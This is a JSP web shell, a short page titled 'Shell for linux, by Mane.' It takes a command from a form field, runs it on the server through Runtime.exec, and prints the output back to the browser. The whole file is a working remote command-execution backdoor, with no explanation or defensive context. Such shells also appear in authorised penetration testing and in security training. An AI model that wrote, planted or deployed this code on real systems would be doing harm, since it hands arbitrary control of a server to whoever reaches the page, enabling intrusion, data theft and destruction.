<%@ page import="java.util.*,java.io.*,java.net.*" %>
<HTML>
<BODY>
    <p>Shell for linux , by Mane.</p>
    <FORM METHOD="POST" NAME="manesec" ACTION="">
        <INPUT TYPE="text" style="width:80%" NAME="cmd">
        <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "\n<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
	            disr = disr.replaceAll("<", "&lt;");
	            disr = disr.replaceAll(">", "&gt;");
	            disr = disr.replaceAll("\r\n", "<br>");            
                out.println(disr); 
                disr = dis.readLine(); 
            }
        }
%>

    </pre>
</BODY>